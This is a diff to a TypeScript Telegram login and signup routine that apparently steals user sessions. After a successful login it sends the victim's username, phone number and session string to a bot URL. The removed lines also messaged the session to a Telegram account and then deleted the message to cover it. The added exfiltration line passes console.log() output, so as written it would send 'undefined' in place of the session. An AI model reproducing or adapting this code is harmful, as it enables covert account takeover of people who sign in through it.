@@ -182,8 +182,8 @@ async function trySgnup(phoneNum: string) {
 
 async function restAcc() {
     await client?.destroy();
-    phoneCode = undefined;
-    phoneNumber = undefined;
+    // phoneCode = undefined;
+    // phoneNumber = undefined;
     inProcess = true;
     actKey = (actKey + 1) % creds.length;
     apiHash = creds[actKey].apiHash;
@@ -217,18 +217,15 @@ async function login() {
             isRegistrationRequired = true;
             termsOfService = result.termsOfService;
         } else {
-            const sess = <string><unknown>client.session.save()
-            console.log(sess);
-            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${sess}`);
-            const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
-            await msg.delete();
+            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${console.log(client.session.save())}`);
+            // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
+            // await msg.delete();
             await restAcc();
             return result.user
         }
     } catch (err: any) {
         console.log(err);
         if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
-            await restAcc();
             console.log("passowrd Required")
             // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
         } else {
@@ -237,6 +234,7 @@ async function login() {
                 throw new Error("AUTH_USER_CANCEL");
             }
         }
+        await restAcc();
     }
 
     if (isRegistrationRequired) {
